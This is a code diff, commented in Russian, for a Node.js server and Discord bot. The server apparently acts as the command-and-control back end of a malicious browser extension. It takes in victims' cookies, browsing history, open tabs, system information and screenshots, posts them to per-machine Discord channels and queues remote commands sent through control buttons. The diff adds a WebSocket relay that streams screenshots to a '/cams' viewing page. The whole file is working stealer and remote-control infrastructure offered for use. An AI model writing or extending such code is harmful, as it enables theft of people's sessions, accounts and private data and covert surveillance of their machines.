@@ -1,5 +1,6 @@
 import express from "express";
 import { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } from "discord.js";
+import { WebSocketServer } from "ws";
 
 const app = express();
 app.use(express.json({ limit: "50mb" }));
@@ -14,10 +15,13 @@ const pendingCommands = {};
 const channelByPC = {};
 const messagesWithButtons = {};
 
+// Хранилище WS-подключений по pcId
+const wsClients = {};
+
 const bot = new Client({ intents: [GatewayIntentBits.Guilds] });
 bot.once("ready", ()=>console.log(`✅ Бот вошёл как ${bot.user.tag}`));
 
-// Создание кнопок управления ПК
+// ---------- Кнопки управления ----------
 function createControlButtons(pcId) {
     return [new ActionRowBuilder().addComponents(
         new ButtonBuilder().setCustomId(`check_online|${pcId}`).setLabel("Чек онлайн").setStyle(ButtonStyle.Primary),
@@ -28,7 +32,7 @@ function createControlButtons(pcId) {
     )];
 }
 
-// Обработка нажатий кнопок
+// ---------- Обработка кнопок ----------
 bot.on("interactionCreate", async interaction => {
     if(!interaction.isButton()) return;
     const [command, ...pcIdParts] = interaction.customId.split("|");
@@ -51,7 +55,7 @@ bot.on("interactionCreate", async interaction => {
     await interaction.reply({ content: `✅ Команда "${command}" отправлена ПК ${pcId}`, ephemeral:true });
 });
 
-// Категория
+// ---------- Категория и канал ----------
 async function getOrCreateCategory(guild, name){
     const channels = await guild.channels.fetch();
     let category = channels.find(c=>c.type===ChannelType.GuildCategory && c.name===name);
@@ -59,7 +63,6 @@ async function getOrCreateCategory(guild, name){
     return category;
 }
 
-// Текстовый канал для ПК
 async function getOrCreateTextChannel(guild, name, parentId){
     const channels = await guild.channels.fetch();
     let channel = channels.find(c=>c.type===ChannelType.GuildText && c.name===name && c.parentId===parentId);
@@ -67,7 +70,7 @@ async function getOrCreateTextChannel(guild, name, parentId){
     return channel;
 }
 
-// Прием данных от расширения
+// ---------- Приём данных от расширения ----------
 app.post("/upload", async (req,res)=>{
     try{
         const { pcId,cookies,history,systemInfo,tabs,extensions,screenshot,command } = req.body;
@@ -93,7 +96,6 @@ app.post("/upload", async (req,res)=>{
 
         if(files.length) await channel.send({ files });
 
-        // --------- Удаление старых кнопок и отправка новых ----------
         if(messagesWithButtons[pcId]){
             try {
                 const oldMsg = await channel.messages.fetch(messagesWithButtons[pcId]);
@@ -104,11 +106,16 @@ app.post("/upload", async (req,res)=>{
         const newMsg = await channel.send({ content:`Управление ПК ${pcId}`, components:createControlButtons(pcId) });
         messagesWithButtons[pcId] = newMsg.id;
 
+        // ---------- Отправка скриншота через WS ----------
+        if(screenshot && wsClients[pcId]){
+            wsClients[pcId].forEach(ws=>ws.send(screenshot));
+        }
+
         res.json({ success:true });
     } catch(err){ console.error(err); res.status(500).json({ error:err.message }); }
 });
 
-// Пинг от расширения, получение команд
+// ---------- Пинг от расширения ----------
 app.post("/ping",(req,res)=>{
     const { pcId } = req.body;
     if(!pcId) return res.status(400).json({ error:"pcId required" });
@@ -119,6 +126,36 @@ app.post("/ping",(req,res)=>{
     res.json({ commands });
 });
 
+// ---------- Статика и веб-интерфейс ----------
+app.use(express.static("public")); // папка с HTML/JS клиентом
+
+app.get("/cams", (req,res)=>{
+    res.sendFile(new URL("./public/cams.html", import.meta.url));
+});
+
+// ---------- WebSocket для видеопотока ----------
+const wss = new WebSocketServer({ noServer: true });
+
+wss.on("connection", (ws, req) => {
+    const pcId = new URL(req.url, `http://${req.headers.host}`).searchParams.get("pcId");
+    if(!pcId) return ws.close();
+
+    if(!wsClients[pcId]) wsClients[pcId] = [];
+    wsClients[pcId].push(ws);
+
+    ws.on("close", ()=>{
+        wsClients[pcId] = wsClients[pcId].filter(c=>c!==ws);
+    });
+});
+
+// Интеграция WS с HTTP сервером Express
+import http from "http";
+const server = http.createServer(app);
+server.on("upgrade", (request, socket, head) => {
+    wss.handleUpgrade(request, socket, head, ws => wss.emit("connection", ws, request));
+});
+
+// ---------- Запуск ----------
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, ()=>console.log(`🚀 Сервер слушает порт ${PORT}`));
+server.listen(PORT, ()=>console.log(`🚀 Сервер слушает порт ${PORT}`));
 bot.login(DISCORD_BOT_TOKEN);
